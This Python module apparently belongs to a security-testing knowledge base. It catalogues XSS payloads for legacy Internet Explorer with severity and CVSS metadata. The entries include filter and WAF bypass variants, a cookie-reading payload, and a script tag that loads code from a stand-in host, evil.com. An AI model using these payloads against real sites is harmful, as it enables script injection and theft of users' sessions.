#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26

Internet Explorer Legacy XSS Payloads
For legacy IE/Edge browsers
"""

from ..models import PayloadEntry


IE_LEGACY_DATABASE = {
    # ===== CSS EXPRESSION =====
    "ie_expression_001": PayloadEntry(
        payload='<div style="width:expression(alert(1))">',
        contexts=["html_content", "css"],
        tags=["ie", "legacy", "expression"],
        severity="high",
        cvss_score=7.5,
        description="CSS expression (IE < 8)",
        reliability="low",
    ),
    "ie_expression_002": PayloadEntry(
        payload='<div style="background:url(javascript:alert(1))">',
        contexts=["html_content", "css"],
        tags=["ie", "legacy", "url"],
        severity="high",
        cvss_score=7.5,
        description="CSS url javascript (IE < 8)",
        reliability="low",
    ),
    # ===== BEHAVIOR =====
    "ie_behavior_001": PayloadEntry(
        payload='<div style="behavior:url(xss.htc)">',
        contexts=["html_content", "css"],
        tags=["ie", "legacy", "behavior"],
        severity="high",
        cvss_score=7.5,
        description="CSS behavior HTC",
        reliability="low",
    ),
    # ===== XSS FILTER BYPASS =====
    "ie_filter_001": PayloadEntry(
        payload="<script>a]ert(1)</script>",
        contexts=["html_content"],
        tags=["ie", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="XSS filter bypass ]",
        reliability="low",
    ),
    "ie_filter_002": PayloadEntry(
        payload="<script/src=//evil.com/x.js>",
        contexts=["html_content"],
        tags=["ie", "filter_bypass"],
        severity="high",
        cvss_score=7.5,
        description="XSS filter bypass /",
        reliability="low",
    ),
    # ===== DYNSRC =====
    "ie_dynsrc_001": PayloadEntry(
        payload="<img dynsrc=javascript:alert(1)>",
        contexts=["html_content"],
        tags=["ie", "legacy", "dynsrc"],
        severity="high",
        cvss_score=7.5,
        description="Img dynsrc (IE only)",
        reliability="low",
    ),
    # ===== LOWSRC =====
    "ie_lowsrc_001": PayloadEntry(
        payload="<img lowsrc=javascript:alert(1)>",
        contexts=["html_content"],
        tags=["ie", "legacy", "lowsrc"],
        severity="high",
        cvss_score=7.5,
        description="Img lowsrc (IE only)",
        reliability="low",
    ),
    # ===== BGSOUND =====
    "ie_bgsound_001": PayloadEntry(
        payload="<bgsound src=javascript:alert(1)>",
        contexts=["html_content"],
        tags=["ie", "legacy", "bgsound"],
        severity="high",
        cvss_score=7.5,
        description="Bgsound src (IE only)",
        reliability="low",
    ),
    # ===== DATA BINDING =====
    "ie_databind_001": PayloadEntry(
        payload="<xml id=x><a><b>alert(1)</b></a></xml><span datasrc=#x datafld=b dataformatas=html>",
        contexts=["html_content"],
        tags=["ie", "legacy", "databinding"],
        severity="high",
        cvss_score=7.5,
        description="Data binding XSS (IE)",
        reliability="low",
    ),
    # ===== VML =====
    "ie_vml_001": PayloadEntry(
        payload='<v:rect style="behavior:url(#default#vml)" onmouseover=alert(1)>',
        contexts=["html_content"],
        tags=["ie", "legacy", "vml"],
        severity="high",
        cvss_score=7.5,
        description="VML XSS (IE only)",
        reliability="low",
    ),
    # ===== CONDITIONAL COMMENTS =====
    "ie_conditional_001": PayloadEntry(
        payload="<!--[if gte IE 4]><script>alert(1)</script><![endif]-->",
        contexts=["html_content", "html_comment"],
        tags=["ie", "conditional", "comment"],
        severity="high",
        cvss_score=7.5,
        description="IE conditional comment",
        reliability="low",
    ),
    # ===== HTC FILE =====
    "ie_htc_001": PayloadEntry(
        payload='<public:attach event="onclick" onevent="alert(1)" />',
        contexts=["html_content"],
        tags=["ie", "htc"],
        severity="high",
        cvss_score=7.5,
        description="HTC file XSS",
        reliability="low",
    ),
    # ===== SCRIPTLET =====
    "ie_scriptlet_001": PayloadEntry(
        payload='<object classid="clsid:AE24FDAE-03C6-11D1-8B76-0080C744F389"><param name="url" value="javascript:alert(1)"></object>',
        contexts=["html_content"],
        tags=["ie", "scriptlet", "object"],
        severity="high",
        cvss_score=7.5,
        description="Scriptlet object XSS",
        reliability="low",
    ),
    # === OWASP IE/Legacy Payloads ===
    "owasp-img-dynsrc": PayloadEntry(
        payload="<IMG DYNSRC=\"javascript:alert('XSS')\">",
        contexts=["html_content"],
        tags=["owasp", "dynsrc", "ie-only", "legacy"],
        severity="medium",
        cvss_score=6.0,
        description="IMG DYNSRC - Internet Explorer only",
        reliability="low",
        browser_support=["ie"],
    ),
    "owasp-img-lowsrc": PayloadEntry(
        payload="<IMG LOWSRC=\"javascript:alert('XSS')\">",
        contexts=["html_content"],
        tags=["owasp", "lowsrc", "legacy"],
        severity="medium",
        cvss_score=6.0,
        description="IMG LOWSRC - legacy browsers",
        reliability="low",
    ),
    "owasp-bgsound": PayloadEntry(
        payload="<BGSOUND SRC=\"javascript:alert('XSS');\">",
        contexts=["html_content"],
        tags=["owasp", "bgsound", "ie-only", "legacy"],
        severity="medium",
        cvss_score=6.0,
        description="BGSOUND - Internet Explorer only",
        reliability="low",
        browser_support=["ie"],
    ),
    "owasp-style-expression": PayloadEntry(
        payload="<DIV STYLE=\"width: expression(alert('XSS'));\">",
        contexts=["html_content", "css"],
        tags=["owasp", "style", "expression", "ie-only"],
        severity="medium",
        cvss_score=6.0,
        description="CSS expression - IE only",
        reliability="low",
        browser_support=["ie"],
    ),
    "owasp-waf-applet": PayloadEntry(
        payload='<applet code="javascript:confirm(document.cookie);">',
        contexts=["html_content"],
        tags=["owasp", "waf_bypass", "applet", "legacy"],
        severity="medium",
        cvss_score=6.0,
        description="Applet tag with javascript - legacy",
        reliability="low",
        waf_evasion=True,
    ),
    "owasp-waf-isindex": PayloadEntry(
        payload='<isindex x="javascript:" onmouseover="alert(XSS)">',
        contexts=["html_content"],
        tags=["owasp", "waf_bypass", "isindex", "legacy"],
        severity="medium",
        cvss_score=6.0,
        description="Isindex tag with event - legacy",
        reliability="low",
        waf_evasion=True,
    ),
    "owasp-waf-style-expression": PayloadEntry(
        payload="<style>//*{x:expression(alert(/xss/))}//<style></style>",
        contexts=["html_content", "css"],
        tags=["owasp", "waf_bypass", "style", "expression"],
        severity="medium",
        cvss_score=6.0,
        description="Style expression with comments",
        reliability="low",
        waf_evasion=True,
        browser_support=["ie"],
    ),
    "owasp-object-classid": PayloadEntry(
        payload='<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>',
        contexts=["html_content"],
        tags=["owasp", "waf_bypass", "object", "classid", "ie-only"],
        severity="medium",
        cvss_score=6.0,
        description="OBJECT with CLASSID - IE only",
        reliability="low",
        waf_evasion=True,
        browser_support=["ie"],
    ),
    "owasp-vbscript-img": PayloadEntry(
        payload="<IMG SRC='vbscript:msgbox(\"XSS\")'>",
        contexts=["html_content"],
        tags=["owasp", "vbscript", "ie-only", "legacy"],
        severity="medium",
        cvss_score=6.0,
        description="VBScript in IMG - IE only",
        reliability="low",
        browser_support=["ie"],
    ),
    "owasp-downlevel-hidden": PayloadEntry(
        payload="<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->",
        contexts=["html_content"],
        tags=["owasp", "ie", "conditional", "legacy"],
        severity="medium",
        cvss_score=6.0,
        description="IE conditional comments",
        reliability="low",
        browser_support=["ie"],
    ),
    "owasp-htc-local": PayloadEntry(
        payload='<XSS STYLE="behavior: url(xss.htc);">',
        contexts=["html_content", "css"],
        tags=["owasp", "htc", "behavior", "ie-only"],
        severity="high",
        cvss_score=7.5,
        description="Local HTC file inclusion - IE only",
        reliability="low",
        browser_support=["ie"],
    ),
}

IE_LEGACY_TOTAL = len(IE_LEGACY_DATABASE)
